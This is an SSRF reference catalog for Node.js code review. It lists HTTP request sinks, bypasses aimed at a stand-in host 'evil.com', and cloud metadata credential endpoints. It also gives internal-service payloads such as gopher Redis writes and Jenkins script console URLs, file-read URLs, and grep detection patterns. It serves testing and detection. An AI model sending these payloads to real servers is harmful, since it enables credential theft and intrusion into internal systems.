# SSRF Reference Catalog

> **Search shortcuts:** `grep "^## Request Sinks"` | `grep "^## Bypasses"` | `grep "^## Payloads"` | `grep "^## Cloud"` 

---

## Table of Contents
- [Request Sinks](#request-sinks) — HTTP client libraries that fetch URLs
- [URL Parsing Bypasses](#url-parsing-bypasses) — Bypass allowlists and blocklists
- [Cloud Metadata Endpoints](#cloud-metadata-endpoints) — AWS, GCP, Azure, DigitalOcean targets
- [Internal Service Targets](#internal-service-targets) — Common internal services
- [Payloads](#payloads) — Test payloads for SSRF exploitation
- [Blind SSRF Detection](#blind-ssrf-detection) — Out-of-band techniques
- [False Positives](#false-positives) — What looks like SSRF but isn't
- [Detection Heuristics](#detection-heuristics) — Code pattern matching

---

## Request Sinks

### Node.js HTTP Libraries

| Library | Sink Pattern | Example |
|---------|-------------|---------|
| `http.get()` | `http.get(url, callback)` | `http.get('http://' + userInput, res => ...)` |
| `http.request()` | `http.request(options)` | `http.request({ hostname: userInput, path: '/' })` |
| `https.get()` | `https.get(url)` | `https.get(userInput)` |
| `https.request()` | `https.request(options)` | `https.request({ host: userInput })` |
| `fetch()` (Node 18+) | `fetch(url)` | `fetch(userInput)` |
| `axios()` | `axios.get(url)`, `axios(url)` | `axios.get(userInput)` |
| `axios()` with config | `axios({ url: userInput })` | `axios({ method: 'GET', url: userInput })` |
| `request()` (deprecated) | `request(url)` | `request(userInput)` |
| `got()` | `got(url)` | `got(userInput)` |
| `superagent` | `request.get(url)` | `superagent.get(userInput)` |
| `needle` | `needle('get', url)` | `needle('get', userInput)` |
| `node-fetch` | `fetch(url)` | `import fetch from 'node-fetch'; fetch(userInput)` |
| `undici` | `undici.request(url)` | `undici.request(userInput)` |

### Browser-Side (Client-Side SSRF)

| Pattern | Description |
|---------|-------------|
| `fetch(userInput)` | Browser fetch to attacker-controlled URL |
| `XMLHttpRequest.open('GET', userInput)` | XHR to user URL |
| `new WebSocket(userInput)` | WebSocket to attacker server |
| `navigator.sendBeacon(userInput)` | Beacon to attacker URL |
| `<img src=userInput>` | Image tag with user URL (blind) |
| `<script src=userInput>` | Script tag with user URL |

### URL Construction Functions
| Function | Pattern |
|----------|---------|
| `url.parse()` | `url.parse(userInput)` → then used in request |
| `new URL()` | `new URL(userInput)` → then `.href` used |
| `url.format()` | `url.format(parsedUserUrl)` → then used |
| `path.join()` | `path.join('/api/fetch/', userInput)` → path traversal |

---

## URL Parsing Bypasses

### Allowlist Bypass
```
# Target: https://example.com
https://example.com@evil.com         → Browser: evil.com, Node http: evil.com
https://evil.com#.example.com        → Depends on parser
https://evil.com?.example.com        → Query string bypass
https://example.com.evil.com         → Subdomain of evil.com
https://example.com%40evil.com       → URL-encoded @
https://evil.com/example.com         → Path traversal
https://example.com%2F.evil.com      → Encoded slash
\\evil.com\example.com               → UNC path on Windows
file:///etc/passwd                   → File protocol SSRF
gopher://evil.com:1234/_             → Gopher protocol
dict://evil.com:11211/               → Dict protocol
```

### IP Restriction Bypass
```
http://127.0.0.1                     → Blocked
http://127.1                         → Bypasses (shorthand)
http://0x7f.0x0.0x0.0x1             → Hex encoding
http://2130706433                    → Decimal IP
http://0177.0.0.1                    → Octal encoding
http://[::1]                         → IPv6 localhost
http://[::ffff:127.0.0.1]            → IPv4-mapped IPv6
http://0.0.0.0                       → All interfaces
http://127.0.0.1.nip.io              → nip.io DNS rebinding
http://localhost                     → DNS resolution
http://spoofed.burpcollaborator.net  → DNS rebinding
```

### Protocol Confusion
```
file:///etc/passwd                   → Local file read
gopher://evil.com:22/_SSH            → Gopher protocol
dict://evil.com:6379/INFO            → Dict protocol (Redis)
ftp://evil.com/                      → FTP protocol
jar:file:///tmp/app.jar!/            → Jar protocol
netdoc:///etc/passwd                 → Java netdoc
```

---

## Cloud Metadata Endpoints

### AWS (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

### AWS (IMDSv2 — requires token)
```
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
→ Then use token: X-aws-ec2-metadata-token: <token>
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1.json
```

### Oracle Cloud
```
http://169.254.169.254/opc/v1/instance/
```

---

## Internal Service Targets

| Service | Default Port | SSRF Target |
|---------|-------------|-------------|
| Redis | 6379 | `gopher://localhost:6379/_SET key value` |
| Memcached | 11211 | `dict://localhost:11211/stats` |
| Elasticsearch | 9200 | `http://localhost:9200/_cat/indices` |
| MongoDB | 27017 | HTTP interface on 28017 |
| Docker API | 2375/2376 | `http://localhost:2375/containers/json` |
| Kubernetes API | 6443/443 | `http://localhost:6443/api/v1/pods` |
| etcd | 2379 | `http://localhost:2379/v2/keys` |
| Consul | 8500 | `http://localhost:8500/v1/kv` |
| Apache Hadoop | 50070 | `http://localhost:50070/` |
| Jenkins | 8080 | `http://localhost:8080/script` |
| SMTP | 25 | `gopher://localhost:25/_HELO evil.com` |

---

## Payloads

### Basic SSRF
```
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:8080/admin
http://localhost:3000/debug
file:///etc/passwd
```

### Blind SSRF (OOB via Collaborator)
```
http://{unique}.burpcollaborator.net
http://{unique}.oastify.com
http://{unique}.interact.sh
```

### WAF Bypass Payloads
```
http://0x7f000001/                   # Hex localhost
http://2130706433/                   # Decimal localhost
http://127.0.0.1:80@evil.com/        # Credential confusion
http://127.0.0.1%00@evil.com/        # Null byte
http://localhost%23.evil.com/        # Fragment bypass
```

---

## Blind SSRF Detection

| Technique | Method |
|-----------|--------|
| OOB Callback | Inject attacker URL, listen for HTTP/DNS callback |
| Timing | Measure response time for internal vs external hosts |
| Error messages | Different errors for open/closed ports |
| Side channels | Response size, headers differ by target |

---

## False Positives

| Pattern | Why FP | Verification |
|---------|--------|-------------|
| `fetch('/api/internal/' + id)` | Relative path — not user-controlled domain | Check URL is fixed domain |
| `http.get({ hostname: 'api.internal', path: userInput })` | Hostname is hardcoded | Path-only injection is not SSRF |
| `axios.get(\`https://api.stripe.com/v1/${endpoint}\`)` | Fixed domain, variable path | Not SSRF if domain is hardcoded |
| `new URL(userInput)` for validation only | URL parsed but never fetched | Check that `href`/`toString()` reaches a sink |
| `req.get('host')` used in redirect | Not user input — it's request header | `Host` header is user-controlled but context matters |

---

## Detection Heuristics

### Grep Patterns
```bash
# HTTP request sinks
grep -nE 'https?\.(get|request)\b|fetch\b|axios|request\b|got\b|superagent|needle|node-fetch|undici' file.js

# URL parsing with user input
grep -nE 'url\.parse\(|new URL\(|url\.format\(' file.js

# Cloud metadata endpoints
grep -nE '169\.254\.169\.254|metadata\.google\.internal' file.js
```

### Multi-Step Chain Detection
1. **Source:** User input → `req.query.url`, `req.body.url`, `req.params.path`
2. **Validation gap:** Check for allowlist validation, protocol restrictions, IP filtering
3. **Sink:** HTTP request to user-controlled URL
4. **Red flags:** URL concatenation, missing protocol enforcement, no IP allowlisting
